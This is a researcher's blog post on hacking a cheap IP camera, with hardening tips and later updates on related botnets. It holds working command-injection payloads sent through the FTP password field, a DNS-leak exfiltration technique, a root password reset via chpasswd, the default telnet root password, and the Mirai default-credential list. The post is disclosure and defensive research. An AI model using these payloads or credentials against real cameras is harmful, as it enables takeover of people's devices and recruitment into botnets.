---           
layout: post
title: How I hacked my IP camera, and found this backdoor account
date: 2020-02-05 11:11:59 UTC
updated: 2020-02-05 11:11:59 UTC
comments: false
categories: camera command injection Hack IoT ipcamera junk hacking
---
<div style="text-align: justify;">The time has come. I bought my second IoT device - in the form of a cheap IP camera. As it was the most affordable among all others, my expectations regarding security was low. But this camera was still able to surprise me.</div><div style="text-align: justify;"><br/>Maybe I will disclose the camera model used in my hack in this blog later, but first, I will try to contact someone regarding these issues. Unfortunately, it seems a lot of different cameras have this problem because they share being developed on the same SDK. Again, my expectations are low on this.</div><h2 style="text-align: justify;">The obvious problems</h2><div class="separator" style="clear: both; text-align: center;"><a href="https://z6543.github.io/_img/em.png" src="https://z6543.github.io/_img/em.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="200" src="https://z6543.github.io/_img/em.png" width="200"/></a></div><div><br/></div><div><br/></div><div><div style="text-align: justify;">I opened the box, and I was greeted with a password of four numeric characters. This is the password for the "admin" user, which can configure the device, watch its output video, and so on. Most people don't care to change this anyway.</div></div><div><div style="text-align: justify;"><br/></div></div><div><div style="text-align: justify;">It is obvious that this camera can talk via Ethernet cable or WiFi. Luckily it supports WPA2, but people can configure it for open unprotected WiFi of course. </div></div><div><div style="text-align: justify;"><br/></div></div><div><div style="text-align: justify;">Sniffing the traffic between the camera and the desktop application it is easy to see that it talks via HTTP on port 81. The session management is pure genius. The username and password are sent in every GET request. Via HTTP. Via hopefully not open WiFi. It comes really handy in case you forgot it, but luckily the desktop app already saved the password for you in clear text in </div><div style="text-align: justify;">"C:\Users\&lt;USER&gt;\AppData\Local\VirtualStore\Program Files (x86)\&lt;REDACTED&gt;\list.dat"</div></div><div><div style="text-align: justify;"><br/></div></div><div><div style="text-align: justify;">This nice camera communicates to the cloud via UDP. The destination servers are in Hong Kong - user.ipcam.hk/user.easyn.hk - and China - op2.easyn.cn/op3.easyn.cn. In case you wonder why an IP camera needs a cloud connection, it is simple. This IP camera has a mobile app for Android and iOS, and via the cloud, the users don't have to bother to configure port forwards or dynamic DNS to access the camera. Nice.</div></div><div><br/></div><div>Let's run a quick nmap on this device.</div><pre>PORT     STATE SERVICE    VERSION<br/>23/tcp   open  telnet     BusyBox telnetd<br/>81/tcp   open  http       GoAhead-Webs httpd<br/>| http-auth: <br/>| HTTP/1.1 401 Unauthorized<br/>|_  Digest algorithm=MD5 opaque=5ccc069c403ebaf9f0171e9517f40e41 qop=auth realm=GoAhead stale=FALSE nonce=99ff3efe612fa44cdc028c963765867b domain=:81<br/>|_http-methods: No Allow or Public header in OPTIONS response (status code 400)<br/>|_http-title: Document Error: Unauthorized<br/>8600/tcp open  tcpwrapped<br/></pre><div><div style="text-align: justify;">The already known HTTP server, a telnet server via BusyBox, and a port on 8600 (have not checked so far). The 27-page long online manual does not mention any Telnet port. How shall we name this port? A debug port? Or a backdoor port? We will see. I manually tried 3 passwords for the user root, but as those did not work, I moved on.</div><br/><h2>The double-blind command injection</h2></div><div><div style="text-align: justify;">The IP camera can upload photos to a configured FTP server on a scheduled basis. When I configured it, unfortunately, it was not working at all, I got an invalid username/password on the server. After some debugging, it turned out the problem was that I had a special $ character in the password. And this is where the real journey began. I was sure this was a command injection vulnerability, but not sure how to exploit it. There were multiple problems that made the exploitation harder. I call this vulnerability double-blind command injection. The first blind comes from the fact that we cannot see the output of the command, and the second blind comes from the fact that the command was running in a different process than the webserver, thus any time-based injection involving sleep was not a real solution.</div><div style="text-align: justify;">But the third problem was the worst. It was limited to 32 characters. I was able to leak some information via DNS, like with the following commands I was able to see the current directory:</div><pre>$(ping%20-c%202%20%60pwd%60)</pre>or cleaning up after URL decode:  <br/><pre>$(ping -c 2 `pwd`)</pre>but whenever I tried to leak information from /etc/passwd, I failed. I tried $(reboot) which was a pretty bad idea, as it turned the camera into an infinite reboot loop, and the hard reset button on the camera failed to work as well. Fun times.<br/><br/>The following are some examples of my desperate trying to get shell access. And this is the time to thank EQ for his help during the hacking session night, and for his great ideas.<br/><pre>$(cp /etc/passwd /tmp/a)       ;copy /etc/passwd to a file which has a shorter name<br/>$(cat /tmp/a|head -1&gt;/tmp/b)   ;filter for the first row<br/>$(cat&lt;/tmp/b|tr -d ' '&gt;/tmp/c) ;filter out unwanted characters<br/>$(ping `cat /tmp/c`)           ;leak it via DNS<br/></pre>After I finally hacked the camera, I saw the problem. There is no head, tr, less, more or cut on this device ... Neither netcat, bash ...<br/><br/>I also tried <a href="https://github.com/stasinopoulos/commix" target="_blank">commix</a>, as it looked promising on <a href="https://www.youtube.com/watch?t=297&amp;v=aVTGqiyVz5o" target="_blank">Youtube</a>. Think commix like sqlmap, but for command injection. But this double-blind hack was a bit too much for this automated tool, unfortunately.<br/><br/><div class="separator" style="clear: both; text-align: center;"><a href="https://z6543.github.io/_img/camera2.png" src="https://z6543.github.io/_img/camera2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="435" src="https://z6543.github.io/_img/camera2.png" width="640"/></a></div><br/><br/>But after spending way too much time without progress, I finally found the password to Open Sesame.<br/><pre>$(echo 'root:passwd'|chpasswd)</pre>Now, logging in via telnet<br/><pre>(none) login: root<br/>Password:<br/><br/>BusyBox v1.12.1 (2012-11-16 09:58:14 CST) built-in shell (ash)<br/>Enter 'help' for a list of built-in commands.<br/>#<br/><br/></pre>Woot woot :) I quickly noticed the root of the command injection problem:<br/><br/><pre># cat /tmp/ftpupdate.sh<br/>/system/system/bin/ftp -n&lt;&lt;!<br/>open ftp.site.com 21<br/>user ftpuser $(echo 'root:passwd'|chpasswd)<br/>binary<br/>mkdir  PSD-111111-REDACT<br/>cd PSD-111111-REDACT<br/>lcd /tmp<br/>put 12.jpg 00_XX_XX_XX_XX_CA_PSD-111111-REDACT_0_20150926150327_2.jpg<br/>close<br/>bye<br/></pre><br/><div style="text-align: justify;">Whenever a command is put into the FTP password field, it is copied into this script, and after the script is scheduled, it is interpreted by the shell as commands. After this I started to panic that I forgot to save the content of the /etc/passwd file, so how am I going to crack the default telnet password? "Luckily", rebooting the camera restored the original password. </div><br/>root:LSiuY7pOmZG2s:0:0:Administrator:/:/bin/sh<br/><br/><div style="text-align: justify;">Unfortunately, there is no need to start good-old John The Ripper for this task, as Google can tell you that this is the hash for the password 123456. It is a bit more secure than a <a href="https://www.youtube.com/watch?v=a6iW-8xPw3k" target="_blank">luggage password</a>.</div><div style="text-align: justify;"><br/></div><div class="separator" style="clear: both; text-align: center;"><a href="https://z6543.github.io/_img/camera.png" src="https://z6543.github.io/_img/camera.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="180" src="https://z6543.github.io/_img/camera.png" width="400"/></a></div><div style="text-align: justify;"><br/></div><div style="text-align: justify;"><br/></div><div style="text-align: justify;">It is time to recap what we have. <b><u>There is an undocumented telnet port on the IP camera, which can be accessed by default with root:123456, there is no GUI to change this password, and changing it via console, it only lasts until the next reboot. I think it is safe to tell this a backdoor.</u></b></div><div style="text-align: justify;">With this console access we can access the password for the FTP server, for the SMTP server (for alerts), the WiFi password (although we probably already have it), access the regular admin interface for the camera, or just modify the camera as we want. In most deployments, luckily this telnet port is behind NAT or firewall, so not accessible from the Internet. But there are always exceptions. Luckily, UPNP does not configure the Telnet port to be open to the Internet, only the camera HTTP port 81. You know, the one protected with the 4 character numeric password by default.</div><div style="text-align: justify;"><br/></div><div style="text-align: justify;">Last but not least everything is running as root, which is not surprising. </div><h2 style="text-align: justify;">My hardening list</h2><div style="text-align: justify;">I added these lines to the end of /system/init/ipcam.sh:</div><pre>sleep 15<br/>echo 'root:CorrectHorseBatteryRedStaple'|chpasswd<br/></pre><div style="text-align: justify;"></div><div style="text-align: justify;">Also, if you want, you can disable the telnet service by commenting out telnetd in /system/init/ipcam.sh.</div><div style="text-align: justify;"><br/></div><div style="text-align: justify;">If you want to disable the cloud connection (thus rendering the mobile apps unusable), put the following line into the beginning of /system/init/ipcam.sh</div><pre>iptables -A OUTPUT -p udp ! --dport 53 -j DROP</pre><pre></pre><div style="text-align: justify;"></div>You can use OpenVPN to connect into your home network and access the web interface of the camera. It works from Android, iOS, and any desktop OS.<br/><h2>My TODO list</h2><div style="text-align: justify;"><ul><li>Investigate the script /system/system/bin/gmail_thread</li><li>Investigate the cloud protocol * - see update 2016 10 27</li><li>Buy a Raspberry Pie, integrate with a good USB camera, and watch this IP camera to burn</li></ul><div>A quick googling revealed I am not the first finding this telnet backdoor account in IP cameras, although others found it via JTAG firmware dump. </div><div><br/></div><div>And 99% of the people who buy these IP cameras think they will be safe with it. Now I understand the sticker which came with the IP camera.</div><div><br/></div><div class="separator" style="clear: both; text-align: center;"><a href="https://z6543.github.io/_img/2015-09-252B18.58.41.jpg" src="https://z6543.github.io/_img/2015-09-252B18.58.41.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="320" src="https://z6543.github.io/_img/2015-09-252B18.58.41.jpg" width="223"/></a></div><div class="separator" style="clear: both; text-align: center;"><br/></div><div class="separator" style="clear: both; text-align: justify;">When in the next episode of Mr. Robot, you see someone logging into an IP camera via telnet with root:123456, you will know, it is the sad reality.</div><div class="separator" style="clear: both; text-align: justify;"><br/></div><div class="separator" style="clear: both; text-align: justify;">If you are interested in generic ways to protect your home against IoT, read <a href="http://jumpespjump.blogspot.nl/2015/08/how-to-secure-your-home-against.html" target="_blank">my previous blog post</a> on this. </div><div class="separator" style="clear: both; text-align: justify;"><br/></div><div class="separator" style="clear: both; text-align: justify;">Update: as you can see in the following screenshot, the bad guys already started to take advantage of this issue ... https://www.incapsula.com/blog/cctv-ddos-botnet-back-yard.html</div><div class="separator" style="clear: both; text-align: justify;"></div><div class="separator" style="clear: both;"><a href="https://z6543.github.io/_img/blogger-image--2098725782.jpg" src="https://z6543.github.io/_img/blogger-image--2098725782.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://z6543.github.io/_img/blogger-image--2098725782.jpg"/></a></div><br/><div>Update 20161006: The Mirai source code was leaked last week, and these are the worst passwords you can have in an IoT device. If your IoT device has a Telnet port open (or SSH), scan for these username/password pairs.<br/><br/>root     xc3511<br/>root     vizxv<br/>root     admin<br/>admin    admin<br/>root     888888<br/>root     xmhdipc<br/>root     default<br/>root     juantech<br/>root     123456<br/>root     54321<br/>support  support<br/>root     (none)<br/>admin    password<br/>root     root<br/>root     12345<br/>user     user<br/>admin    (none)<br/>root     pass<br/>admin    admin1234<br/>root     1111<br/>admin    smcadmin<br/>admin    1111<br/>root     666666<br/>root     password<br/>root     1234<br/>root     klv123<br/>Administrator admin<br/>service  service<br/>supervisor supervisor<br/>guest    guest<br/>guest    12345<br/>guest    12345<br/>admin1   password<br/>administrator 1234<br/>666666   666666<br/>888888   888888<br/>ubnt     ubnt<br/>root     klv1234<br/>root     Zte521<br/>root     hi3518<br/>root     jvbzd<br/>root     anko<br/>root     zlxx.<br/>root     7ujMko0vizxv<br/>root     7ujMko0admin<br/>root     system<br/>root     ikwb<br/>root     dreambox<br/>root     user<br/>root     realtek<br/>root     00000000<br/>admin    1111111<br/>admin    1234<br/>admin    12345<br/>admin    54321<br/>admin    123456<br/>admin    7ujMko0admin<br/>admin    1234<br/>admin    pass<br/>admin    meinsm<br/>tech     tech<br/>mother   fucker</div><div><br/>Update 2016 10 27: As I already mentioned this at multiple conferences, the cloud protocol is a nightmare. It is clear-text, and even if you disabled port-forward/UPNP on your router, the cloud protocol still allows anyone to connect to the camera if the attacker knows the (brute-forceable) camera ID. Although this is the user-interface only, now the attacker can use the command injection to execute code with root privileges. Or just grab the camera configuration, with WiFi, FTP, SMTP passwords included.<br/>Youtube video : https://www.youtube.com/watch?v=18_zTjsngD8<br/>Slides (29 - ) https://www.slideshare.net/bz98/iot-security-is-a-nightmare-but-what-is-the-real-risk<br/><div class="separator" style="clear: both; text-align: center;"><a href="https://z6543.github.io/_img/ipcamera_protocol2.png" src="https://z6543.github.io/_img/ipcamera_protocol2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="472" src="https://z6543.github.io/_img/ipcamera_protocol2.png" width="640"/></a></div><br/>Update 2017-03-08: "<span style="text-align: start; white-space: pre-wrap;">Because of code reusing, the vulnerabilities are present in a massive list of cameras (especially the InfoLeak and the RCE),</span><br/><span style="text-align: start; white-space: pre-wrap;">which allow us to execute root commands against 1250+ camera models with a pre-auth vulnerability. </span>"<a href="https://pierrekim.github.io/advisories/2017-goahead-camera-0x00.txt">https://pierrekim.github.io/advisories/2017-goahead-camera-0x00.txt</a><br/><br/>Update 2017-05-11: CVE-2017-5674 (see above), and my command injection exploit was combined in the Persirai botnet. 120 000 cameras are expected to be infected soon. If you still have a camera like this at home, please consider the following recommendation by Amit Serper "The only way to guarantee that an affected camera is safe from these exploits is to throw it out. Seriously."<br/>This issue might be worse than the Mirai worm because these effects cameras and other IoT behind NAT where UPnP was enabled.<br/><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/persirai-new-internet-things-iot-botnet-targets-ip-cameras/">http://blog.trendmicro.com/trendlabs-security-intelligence/persirai-new-internet-things-iot-botnet-targets-ip-cameras/</a><br/><span style="background-color: white; font-size: 14px; text-align: left;"><span style='color: #666666; font-family: "arial" , sans-serif;'><br/></span></span><span style='background-color: white; color: #666666; font-family: "arial" , sans-serif; font-size: 14px; text-align: left;'><br/></span></div></div></div>